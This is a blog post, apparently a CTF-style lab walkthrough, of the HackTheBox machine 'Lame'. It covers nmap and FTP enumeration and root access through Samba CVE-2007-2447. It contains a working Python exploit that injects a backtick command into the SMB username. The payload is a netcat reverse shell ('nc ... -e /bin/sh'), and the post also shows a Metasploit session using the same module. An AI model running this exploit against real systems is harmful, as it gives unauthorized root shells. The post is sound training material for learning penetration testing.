@@ -1,0 +1,220 @@
+---
+layout: post
+title:  "HackTheBox - Lame"
+date:   2022-05-01 17:29:02 +0100
+tags: RCE CVE-2007-2447 SMB 
+---
+**Difficulty: <span style="color:green">Easy</span>**  
+**Personal Difficulty: <span style="color:green">Easy</span>**   
+**Rating: 4.4 / 5**  
+
+This box is arguably one of the easiest on the site. I decided to complete it mainly because I
+didn't feel confident with other boxes labelled 'easy' so I wanted to attempt one that was ranked
+as easy by users. And it indeed was.  
+
+The key to owning this box was to pay attention to software versions, and keep on the lookout for 
+outdated or vulnerable versions specifically. This problem identification is what allowed me to
+discover a key RCE vulnerability which I show how to exploit in 2 different ways in this walkthrough.  
+
+### Enumeration  
+
+To start, a ran a Nmap scan for version to identify service versions as well as running default scripts
+on the remote system.
+
+```bash
+nmap -sC -sV -oN scan.nmap
+```
+
+	Nmap scan report for 10.10.10.3
+	Host is up (0.019s latency).
+	Not shown: 996 filtered tcp ports (no-response)
+	PORT    STATE SERVICE     VERSION
+	21/tcp  open  ftp         vsftpd 2.3.4
+	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.10.14.21
+	|      Logged in as ftp
+	|      TYPE: ASCII
+	|      No session bandwidth limit
+	|      Session timeout in seconds is 300
+	|      Control connection is plain text
+	|      Data connections will be plain text
+	|      vsFTPd 2.3.4 - secure, fast, stable
+	|_End of status
+	22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Host script results:
+	| smb-os-discovery: 
+	|   OS: Unix (Samba 3.0.20-Debian)
+	|   Computer name: lame
+	|   NetBIOS computer name: 
+	|   Domain name: hackthebox.gr
+	|   FQDN: lame.hackthebox.gr
+	|_  System time: 2022-04-20T07:11:43-04:00
+	|_smb2-time: Protocol negotiation failed (SMB2)
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	|_clock-skew: mean: 2h00m48s, deviation: 2h49m44s, median: 46s
+
+Ports 21, 22, 139 and 445 are open. SMB 3.0.20 was being run on Debian according to the smb-os-discovery script.
+Server Message Block (SMB) is a protocol designed for file and resource sharing on a
+network. It's mainly for connecting Windows computers, but can be run on Unix systems too. You can find
+more about it [here](https://en.wikipedia.org/wiki/Server_Message_Block).  
+
+I considered that SMB wouldn't be as secure on linux (which is not the case after doing some further research) or 
+that they may be running a faulty version. However I didn't go into that just yet. Instead, I decided to check out the FTP
+server since anonymous login was allowed. To login via FTP anonymously, use the username `anonymous` and leave
+the password blank.  
+
+	$ ftp 10.10.10.3
+	Connected to 10.10.10.3.
+	220 (vsFTPd 2.3.4)
+	Name (10.10.10.3:infiltr8): anonymous
+	331 Please specify the password.
+	Password: 
+	230 Login successful.
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> dir
+	229 Entering Extended Passive Mode (|||38290|).
+	150 Here comes the directory listing.
+	226 Directory send OK.
+	ftp>  
+
+
+Looks like there's no files to be share on the server. 
+I also connected to the system with SMB but found nothing of interest.
+With that, I'll start to investigate the specific SMB version, 3.0.20-Debian.    
+
+A quick google search showed me that this machine was vulnerable to [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447).
+A further search brought me to [this Metasploit script](https://www.exploit-db.com/exploits/16320). On inspection,
+It seems like adding  "/=\`nohup"  and then a shell command (ending with \`) will allow for shell code execution.
+`nohup` (no hangup) is a supplemental command used to keep certain processes or commands running even after logging out or disconnecting
+from our shell. I'll exploit this using a script.
+
+### <span style="color:red">Shell as Root</span>
+
+I'll start off by showing the 'best practice' exploit, by writing a python script. All this script will do is attempt to connect to the
+vulnerable system with the corrupt username and then the payload.  
+
+```python
+#!/usr/bin/python3
+from smb.SMBConnection import SMBConnection
+
+payload = "nc 10.10.14.21 4444 -e /bin/sh"
+username = "/=`nohup " + payload + "`"
+
+connection = SMBConnection(username, "", "", "")
+connection.connect("10.10.10.3",445)
+```
+  
+This was a simple enough script, but necessary since the payload cannot be injected via smbclient. I set up a netcat listener on another
+terminal and got root access; both flags captured.  
+
+```bash
+$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.3] 35336
+whoami
+root
+cd root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+```
+
+And user flag:
+
+```bash
+cd /home
+ls
+ftp
+makis
+service
+user
+cd makis && ls
+user.txt
+```
+### Metasploit method
+
+This is essentially the same as what I did but with Metasploit.  
+
+Searching for the script:
+
+	msf6 > search usermap script
+
+	Matching Modules
+	================
+
+	   #  Name                                Disclosure Date  Rank       Check  Description
+	   -  ----                                ---------------  ----       -----  -----------
+	   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+	Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+	msf6 > use 0
+	[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+	
+Setting options:
+
+	msf6 exploit(multi/samba/usermap_script) > show options
+
+	Module options (exploit/multi/samba/usermap_script):
+
+	   Name    Current Setting                                   Required  Description
+	   ----    ---------------                                   --------  -----------
+	   RHOSTS  10.10.10.3; set RPORT 445, set LHOST 10.10.14.21  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+	   RPORT   139                                               yes       The target port (TCP)
+
+
+	Payload options (cmd/unix/reverse_netcat):
+
+	   Name   Current Setting  Required  Description
+	   ----   ---------------  --------  -----------
+	   LHOST  192.168.50.241   yes       The listen address (an interface may be specified)
+	   LPORT  4444             yes       The listen port
+
+
+	Exploit target:
+
+	   Id  Name
+	   --  ----
+	   0   Automatic
+
+
+	msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+	RHOSTS => 10.10.10.3
+	msf6 exploit(multi/samba/usermap_script) > set RPORT 445
+	RPORT => 445
+	msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.21
+	LHOST => 10.10.14.21
+	msf6 exploit(multi/samba/usermap_script) > exploit
+
+	[*] Started reverse TCP handler on 10.10.14.21:4444 
+	[*] Command shell session 1 opened (10.10.14.21:4444 -> 10.10.10.3:46546 ) at 2022-05-02 15:58:43 +0100
+
+We got shell as root:
+
+```bash
+whoami
+root
+cd root && ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+```
